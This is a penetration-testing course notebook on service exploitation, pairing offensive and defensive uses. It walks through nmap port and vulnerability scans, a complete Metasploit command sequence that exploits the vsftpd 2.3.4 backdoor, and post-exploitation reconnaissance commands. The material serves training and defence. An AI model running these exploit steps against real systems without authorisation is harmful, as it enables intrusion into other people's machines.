# 07 Command Notebook — Protocol and Service Exploitation

This module is about turning service exposure into a real exploit path. The offensive angle is to enumerate the target, identify exact service versions, verify the vulnerable condition, and only then run the exploit. The defensive angle is to reduce exposure, keep software updated, and log exploit attempts and service misuse.

## 1) Service enumeration and version detection

```bash
nmap -p- <TARGET>
nmap -sV <TARGET>
nmap --script safe <TARGET>
nmap --script vuln <TARGET>
```

### Offensive purpose
- `nmap -p-`: full port sweep to see every open port.
- `nmap -sV`: identify service versions so you can match them to known vulnerabilities.
- `--script safe`: run low-risk scripts for reconnaissance.
- `--script vuln`: look for scriptable vulnerabilities and known issues.

### Defensive purpose
- A defender uses this to discover whether the host is exposing more than it should and whether any old versions are visible from the network.
- Attackers tend to pick the oldest or most reachable service first; defenders reduce that attack surface.

---

## 2) Exploit module validation with Metasploit

```bash
msfconsole
search vsftpd 2.3.4
info exploit/unix/ftp/vsftpd_234_backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <TARGET>
set RPORT 21
check
run
```

### Offensive purpose
- `search` finds modules related to the target service.
- `info` explains preconditions, payloads, requirements, and impact.
- `check` verifies whether the target matches the vulnerability before the exploit is launched.
- `run` executes the exploit only after you understand the conditions.

### Defensive purpose
- Blue teams can use the same workflow to test whether services are patched or to understand which modules are likely to succeed.
- Detection is easier when you know the service version and whether it exposes a known exploit path.

---

## 3) Post-exploit activity on a lab target

```bash
whoami
id
hostname
uname -a
pwd
```

### Offensive purpose
- Confirms what level of access the exploit produced.
- Establishes the environment before doing anything else.

### Defensive purpose
- Logs, process creation, and unexpected shells are key detection indicators.
- A defender looks for unexpected new processes or SSH/HTTP access from unusual places.

---

## 4) TLS, SSH, and service inspection

```bash
openssl s_client -connect <TARGET>:443 -servername lab.test
curl -I http://<TARGET>/
ssh -v user@<TARGET>
```

### Offensive purpose
- `openssl s_client`: inspect TLS behavior, certificate information, supported protocols, and negotiation details.
- `curl -I`: confirm the HTTP service and headers.
- `ssh -v`: inspect SSH version and negotiation details.

### Defensive purpose
- These commands are used to verify that only expected services are exposed and that the service versions and configurations match policy.

---

## Key lesson
- A scan result is not proof of exploitation.
- A version match is not proof of impact.
- The vulnerable condition must be validated and the effect must be proven in a controlled target.
